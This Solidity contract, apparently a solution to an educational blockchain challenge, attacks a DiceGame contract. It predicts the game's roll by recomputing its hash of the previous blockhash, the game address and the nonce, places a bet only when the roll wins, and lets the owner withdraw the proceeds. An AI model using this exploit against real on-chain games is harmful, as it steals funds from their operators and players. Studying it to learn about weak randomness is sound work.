pragma solidity >=0.8.0 <0.9.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement withdraw function that lets the owner withdraw ETH
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance");
        (bool success,) = _addr.call{value: _amount}("");
        require(success, "Transfer failed");
    }

    // Predict the next roll and only roll when it's a winner
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance");
        
        // Predict the random number exactly like the DiceGame contract
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;
        
        // Only roll if we predict a win (numbers 0-5 are winning rolls)
        require(roll <= 5, "Not a winning roll");
        
        // Call the rollTheDice function with required 0.002 ether
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // Receive function to allow contract to receive Ether
    receive() external payable {}
}